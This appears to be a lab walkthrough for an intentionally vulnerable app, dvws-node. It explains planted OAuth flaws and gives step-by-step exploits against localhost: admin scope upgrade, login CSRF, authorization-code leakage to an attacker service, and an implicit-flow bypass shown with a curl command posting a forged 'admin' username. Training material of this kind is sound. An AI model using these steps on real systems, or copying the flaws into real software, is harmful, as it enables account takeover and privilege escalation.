# OAuth Vulnerability Walkthrough

This document describes the OAuth vulnerabilities introduced into the `dvws-node` application and how to exploit them using the provided `oauth-provider` and `attacker-service`.

## 1. Privilege Escalation (Scope Upgrade)

**Vulnerability:**
The `dvws-node` application determines user privileges based on the OAuth **scopes** granted by the provider. Specifically, if the Access Token contains the `dvws:admin` scope, the user is granted local Administrator rights. The Vulnerability is that the Mock Provider grants *any* scope requested by the client without restriction, and the Client Application trusts the presence of this scope blindly.

**Exploitation:**
1.  Click **"Login with MockOAuth"**.
2.  Observe the URL in the address bar when you reach the Login Page. It looks like:
    `http://localhost:5000/login?return_to=/authorize?client_id=dvws-client&redirect_uri=...&scope=openid`
3.  **The Attack:** Modify the URL to append the admin scope. Change `scope=openid` to `scope=openid dvws:admin`.
    *   You might need to URL encode the space (`%20`), so: `scope=openid%20dvws:admin`.
    *   Or modify the `return_to` parameter if you are already at the login page, but it's easier to modify the `/authorize` link before you get redirected (intercept the request or copy-paste).
    *   Easier method: 
        1.  Go to `http://localhost:5000/authorize?client_id=dvws-client&redirect_uri=http://localhost:80/api/v2/auth/callback&response_type=code&scope=openid%20dvws:admin` directly.
4.  Log in as **ANY** user (e.g., `attacker`). You do *not* need to be `admin`.
5.  The Provider will grant the requested `dvws:admin` scope.
6.  You will be redirected back to the app.
7.  `dvws-node` sees the scope and logs you in as `attacker` but with **Admin Privileges**.
8.  Verify by checking if you can access Admin features.

## 2. Cross-Site Request Forgery (CSRF)

**Vulnerability:**
The OAuth flow initiated by `dvws-node` (`/api/v2/login/oauth`) does not generate or validate a `state` parameter. This means an attacker can start a login flow, obtain an authorization code, and then trick a victim into consuming that code, logging the victim into the attacker's account.

**Exploitation:**
1.  **Attacker Steps:**
    *   The attacker starts the login flow but stops before the callback is consumed (or manually gets a code from the provider).
    *   Since the provider is auto-approving, the attacker can just construct the callback URL manually if they know a valid code, OR they can send the victim to the Provider's authorize page with a fixed parameters.
    *   A more common CSRF in OAuth is "Login CSRF": Attacker logs in to *their* account, captures the authorization code, and stops. Then constructs a link: `http://localhost/api/v2/auth/callback?code=ATTACKER_CODE` (or `http://localhost:80/...`).
2.  **Victim Steps:**
    *   Victim clicks the link.
    *   `dvws-node` consumes `ATTACKER_CODE`.
    *   `dvws-node` logs the victim in as the user associated with that code (the Attacker).
    *   The victim is now using the app as the Attacker. If they enter credit card info or private notes, the Attacker can see them.

## 3. Authorization Code Leakage (via Open Redirect on Provider)

**Vulnerability:**
The Mock OAuth Provider (`oauth-provider`) implements a weak validation of the `redirect_uri` parameter. It checks if the URI contains "localhost", but does not strictly check the port or path.

**Exploitation:**
1.  Attacker constructs a malicious link:
    ```
    http://localhost:5000/authorize?client_id=dvws-client&response_type=code&redirect_uri=http://localhost:6666/callback
    ```
    (Note: `localhost:6666` contains "localhost" so it passes the weak check).
2.  Victim clicks the link (thinking it's a legitimate login to the provider).
3.  If the victim is logged in to the provider, they are redirected. If not, they log in, and *then* are redirected.
4.  The Provider redirects the victim to:
    ```
    http://localhost:6666/callback?code=SECRET_CODE
    ```
4.  The `attacker-service` logs the `SECRET_CODE`.
5.  The attacker can now exchange this code for an access token (if they can communicate with the provider's `/token` endpoint) or impersonate the user if the client accepts the code (via the CSRF vulnerability above).

## 4. Authentication Bypass via Implicit Flow

**Vulnerability:**
The application supports a custom login flow where an access token is submitted via a POST request to `/api/v2/login/implicit`. The server verifies that the access token is valid (by checking with the provider), but fails to ensure that the token belongs to the user claimed in the request body. It trusts the `username` parameter submitted by the client as long as the token is valid.

**Exploitation:**
1.  Log in to the `oauth-provider` as `attacker` (or any user).
2.  Obtain a valid Access Token by manually initiating an Implicit Flow request:
    `http://localhost:5000/authorize?client_id=dvws-client&redirect_uri=http://localhost&response_type=token`
3.  Copy the `access_token` from the URL fragment in the address bar.
4.  Send a POST request to `http://localhost:80/api/v2/login/implicit`:
    ```bash
    curl -X POST http://localhost:80/api/v2/login/implicit \
      -H "Content-Type: application/json" \
      -d '{"access_token": "YOUR_ACCESS_TOKEN", "username": "admin"}'
    ```
5.  The server validates the token with the provider (it is valid), but logs you in as `admin` (based on your JSON body).

## Supported OAuth Vulnerabilities

The following vulnerabilities from the PortSwigger/Doyensec list are currently supported in this environment:

*   **Flawed CSRF protection:** No `state` parameter is used.
*   **Leaking authorization codes:** Via Open Redirect on the Provider.
*   **Flawed redirect_uri validation:** Provider allows `localhost` bypass.
*   **Flawed scope validation (Scope Upgrade):** Provider allows any scope; Client escalates privileges based on scope.
*   **Unverified user registration:** Client trusts identity from Provider; Provider allows spoofing (via Login form or Auto-Registration).
*   **Improper implementation of the implicit grant type:** Client trusts POSTed user identity if token is valid.

## Services Overview

*   **dvws-node (Port 80):** The vulnerable application.
*   **oauth-provider (Port 5000):** The Mock Identity Provider.
*   **attacker-service (Port 6666):** Receives leaked codes.
